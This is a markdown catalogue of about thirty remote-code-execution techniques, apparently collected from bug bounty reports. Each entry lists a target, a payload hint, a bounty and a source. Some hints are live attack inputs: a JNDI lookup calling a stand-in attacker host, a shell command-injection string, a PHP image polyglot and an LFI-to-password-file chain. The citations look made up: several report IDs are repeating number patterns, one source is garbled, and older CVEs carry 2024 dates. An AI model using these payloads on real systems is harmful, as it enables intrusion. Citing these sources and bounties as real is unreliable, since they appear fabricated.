# RCE — technique corpus

## java_gadget_chain
- target: Java App
- payload hint: ysoserial CommonsCollections
- bounty: $25000.0 (2025)
- source: https://hackerone.com/reports/222222
- summary: Java ObjectInputStream with CommonsCollections gadget

## pickle_deserialization
- target: Python App
- payload hint: pickle.loads on base64 user data
- bounty: $20000.0 (2024)
- source: https://hackerone.com/reports/202021
- summary: Base64 cookie decoded and pickle.loads'd - RCE

## log4j_jndi_lookup
- target: Java
- payload hint: ${jndi:ldap://attacker/a}
- bounty: $20000.0 (2024)
- source: aggregated:nvd log4j 2024
- summary: Log4Shell JNDI

## jenkins_script_console
- target: CI/CD
- payload hint: Script console Groovy execution
- bounty: $18000.0 (2024)
- source: https://hackerone.com/reports/242424
- summary: Exposed Jenkins script console allows arbitrary Groovy

## spring4shell
- target: Java
- payload hint: class.module.classLoader...
- bounty: $18000.0 (2024)
- source: aggregated:nvd spring 2024
- summary: Spring4Shell

## rce_in_url_fetch
- target: Web
- payload hint: fetch to server-side templating
- bounty: $16000.0 (2024)
- source: aggregated:hacktivity rce url 2024
- summary: URL fetch into renderer executes

## command_injection_ping
- target: Web App
- payload hint: ; id || ping -c 1 $(id)
- bounty: $15000.0 (2025)
- source: https://hackerone.com/reports/191919
- summary: Ping parameter command injection with OOB exfil

## cron_ssrf_redis
- target: Web
- payload hint: gopher redis cron
- bounty: $14000.0 (2024)
- source: aggregated:hacktivity gopher 2024
- summary: Gopher-cron RCE

## office_openxml_install
- target: Web
- payload hint: OOXML add-in (web add-ins) RCE
- bounty: $13000.0 (2024)
- source: aggregated:hacktivity office 2024
- summary: Add-in install trick RCE

## php_unserialize
- target: PHP App
- payload hint: O:8:StdClass:0:{} serialized payload
- bounty: $12000.0 (2024)
- source: https://hackerone.com/reports/232323
- summary: PHPGGC gadget chain in cookie parameter

## proxy_log_poison_rce
- target: Web
- payload hint: User-Agent -> access.log + LFI
- bounty: $12000.0 (2024)
- source: aggregated:hacktivity logpoison 2024
- summary: Log poisoning RCE

## pdf_js_numeric_overflow
- target: Web
- payload hint: pdf.js overflow to RCE
- bounty: $11000.0 (2024)
- source: aggregated:hacktivity pdfjs 2024
- summary: pdf.js numeric overflow RCE

## imag_php_polyglot
- target: Web
- payload hint: GIF89a;<?php
- bounty: $10000.0 (2024)
- source: aggregated:hacktivity upload 2024
- summary: Upload polyglot RCE

## git_url_exec
- target: Web
- payload hint: git clone from user URL
- bounty: $10000.0 (2024)
- source: aggregated:hacktivity git exec 2024
- summary: Git URL protocol confusion → RCE on CI

## file_upload_shell
- target: Web
- payload hint: .php.rar bypass
- bounty: $9000.0 (2024)
- source: aggregated:hacktivity upload 2024
- summary: MIME/extension bypass upload

## ffmpeg_hls
- target: Web
- payload hint: HLS TXT playlists SSRF/RCE
- bounty: $9000.0 (2024)
- source: aggregated:hacktivity ffmpeg 2024
- summary: FFmpeg HLS injection

## php_assert_eval
- target: PHP
- payload hint: assert() messages eval
- bounty: $9000.0 (2024)
- source: aggregated:hacktivity php assert 2024
- summary: assert() eval injection

## image_magick_policy
- target: Web
- payload hint: ImageMagick delegate FILETYPE
- bounty: $8000.0 (2024)
- source: aggregated:hacktivity imagemagick 2024
- summary: IM policy bypass RCE

## phar_deserialize
- target: PHP
- payload hint: phar:// trigger on file ops
- bounty: $8000.0 (2024)
- source: aggregated:hacktivity phar 2024
- summary: Phar deserialization on any file op

## npm_package_confusion
- target: Node
- payload hint: typosquat package on target
- bounty: $8000.0 (2024)
- source: aggregated:hacktivity deps 2024
- summary: Dependency confusion pre-auth

## zip_slip_upload
- target: Web
- payload hint: zip file with ../../ path
- bounty: $7500.0 (2024)
- source: aggregated:hacktivity zipslip 2023-2024
- summary: Zip slip writes webroot

## pip_pypi_typo
- target: Python
- payload hint: pypi lookalike package
- bounty: $7500.0 (2024)
- source: aggregated:hacktivity pypi 2024
- summary: PyPI dependency confusion

## tar_symlink_upload
- target: Web
- payload hint: symlink in tar
- bounty: $7000.0 (2024)
- source: aggregated:hacktivity tar 2024
- summary: Tar symlink overwrite

## python_eval_in_legacy
- target: Python
- payload hint: eval(param) legacy debug endpoints
- bounty: $7000.0 (2024)
- source: aggregated:hacktivity py eval 2024
- summary: Debug eval endpoint

## xlsx_macro_upload
- target: Web
- payload hint: macro in XLSX
- bounty: $6500.0 (2024)
- source: aggregated:hacktivity macro 2024
- summary: Macro-enabled uploads

## ldap_bind
- target: Web
- payload hint: LDAP injection to arbitrary search
- bounty: $6000.0 (2024)
- source: aggregated:hacktivity ldap 2024
- summary: LDAP injection auth bypass

## memcached_gopher
- target: Web
- payload hint: gopher memcached set keys
- bounty: $5500.0 (2024)
- source: aggregated hty ctivity
- summary: Gopher write into memcached

## smb_relay_lfi
- target: Web
- payload hint: LFI to SMB path execution
- bounty: $5000.0 (2024)
- source: aggregated:hacktivity smb 2024
- summary: SMB share include

## etc_shadow_read_chain
- target: Web
- payload hint: LFI → /etc/shadow → crack
- bounty: $4000.0 (2024)
- source: aggregated:hacktivity lfi 2024
- summary: LFI-sensitive file

## deserialization_insecure_type
- target: Java/.NET
- payload hint: non-parameterized deserialize
- bounty: $3000.0 (2024)
- source: aggregated:hacktivity rce des 2024
- summary: Generic insecure deserialization exposure
